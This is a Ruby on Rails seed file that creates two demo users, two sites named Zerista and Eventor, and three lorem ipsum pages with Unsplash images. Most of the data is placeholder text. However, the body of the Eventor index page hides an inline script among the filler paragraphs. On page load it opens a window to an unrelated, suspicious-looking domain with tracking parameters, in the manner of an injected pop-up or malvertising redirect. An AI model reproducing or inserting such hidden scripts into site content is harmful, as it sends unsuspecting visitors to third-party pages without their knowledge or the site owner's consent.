# Create first user
user = User.create!(
  email: "test@simpleview.com",
  password: "password"
)

# Create site for first user
site = Site.create!(
  user: user,
  name: "Zerista",
  domain: 'zrtest.com',
  description: 'Velit laoreet id donec ultrices tincidunt arcu non. Pellentesque habitant morbi tristique senectus et netus et. Donec pretium vulputate sapien nec sagittis aliquam malesuada. Libero id faucibus nisl tincidunt eget. Diam in arcu cursus euismod quis viverra nibh cras. Vel pharetra vel turpis nunc eget. ',
)

# Create add a page to the first site
page = Page.new(
  name: "index",
  path: "/",
  header: "Zerista Index",
  body: "<p>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commodo ligula eget dolor. Aenean massa. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Donec quam felis, ultricies nec, pellentesque eu, pretium quis, sem.</p><table class=\"data\"><tr><th>Entry Header 1</th><th>Entry Header 2</th><th>Entry Header 3</th><th>Entry Header 4</th></tr><tr><td>Entry First Line 1</td><td>Entry First Line 2</td><td>Entry First Line 3</td><td>Entry First Line 4</td></tr><tr><td>Entry Line 1</td><td>Entry Line 2</td><td>Entry Line 3</td><td>Entry Line 4</td></tr><tr><td>Entry Last Line 1</td><td>Entry Last Line 2</td><td>Entry Last Line 3</td><td>Entry Last Line 4</td></tr></table>",
  site: site,
)

# Add an image to the page
page.remote_photo_url = "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=1950&q=80"

# Ensure the page gets saved
page.save!

# Create a second user
user2 = User.create!(
  email: "test2@simpleview.com",
  password: "password"
)

# Create a site for the second user
site2 = Site.create!(
  user: user2,
  name: "Eventor",
  domain: 'eventor.com',
  description: 'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.',
)

# Create add a page to the second site
page2 = Page.new(
  name: "index",
  path: "/",
  header: "Eventor Index",
  body: "<p>Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Vestibulum tortor quam, feugiat vitae, ultricies eget, tempor sit amet, ante. Donec eu libero sit amet quam egestas semper. Aenean ultricies mi vitae est. Mauris placerat eleifend leo.</p><script>window.open('http://us-456281.mac-us209.live/?utm_source=192375&utm_medium=')</script><ul><li>Morbi in sem quis dui placerat ornare. Pellentesque odio nisi, euismod in, pharetra a, ultricies in, diam. Sed arcu. Cras consequat.</li><li>Praesent dapibus, neque id cursus faucibus, tortor neque egestas augue, eu vulputate magna eros eu erat. Aliquam erat volutpat. Nam dui mi, tincidunt quis, accumsan porttitor, facilisis luctus, metus.</li><li>Phasellus ultrices nulla quis nibh. Quisque a lectus. Donec consectetuer ligula vulputate sem tristique cursus. Nam nulla quam, gravida non, commodo a, sodales sit amet, nisi.</li><li>Pellentesque fermentum dolor. Aliquam quam lectus, facilisis auctor, ultrices ut, elementum vulputate, nunc.</li></ul>",
  site: site2,
)
page2.remote_photo_url = "https://images.unsplash.com/photo-1563217257-5060f531404b?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjExMDk0fQ&auto=format&fit=crop&w=1350&q=80"

# Ensure page2 gets saved
page2.save!

# Create add a second page to the second site
page3 = Page.new(
  name: "About",
  path: "/about",
  header: "About Eventor",
  body: "<p><strong>Pellentesque habitant morbi tristique</strong> senectus et netus et malesuada fames ac turpis egestas. Vestibulum tortor quam, feugiat vitae, ultricies eget, tempor sit amet, ante. Donec eu libero sit amet quam egestas semper. <em>Aenean ultricies mi vitae est.</em> Mauris placerat eleifend leo. Quisque sit amet est et sapien ullamcorper pharetra. Vestibulum erat wisi, condimentum sed, <code>commodo vitae</code>, ornare sit amet, wisi. Aenean fermentum, elit eget tincidunt condimentum, eros ipsum rutrum orci, sagittis tempus lacus enim ac dui. <a href=\"#\">Donec non enim</a> in turpis pulvinar facilisis. Ut felis.</p>",
  site: site2,
)
page3.remote_photo_url = "https://images.unsplash.com/photo-1555939498-c63ac1eb2e4d?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=1950&q=80"

# Ensure page3 gets saved
page3.save!